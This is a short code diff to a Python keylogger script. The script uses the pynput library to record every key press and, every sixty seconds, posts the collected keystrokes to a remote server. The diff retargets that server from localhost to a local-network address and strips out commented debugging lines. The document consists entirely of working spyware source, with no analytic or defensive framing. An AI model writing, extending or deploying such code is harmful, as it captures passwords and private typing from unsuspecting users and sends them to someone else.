@@ -1,17 +1,14 @@
 from pynput import keyboard
 import requests
 import time
-HOST = "http://localhost:8000"
+HOST = "http://192.168.1.28:8000"
 keyList = []
 
 def main():
     global keyList
-    with keyboard.Listener(on_press=on_press,
-            #on_release=on_release,
-            ) as listener:
+    with keyboard.Listener(on_press=on_press) as listener:
         while True:
             time.sleep(60)
-            #print(keyList)
             posting(HOST, keyList)
             keyList = []
         listener.join()
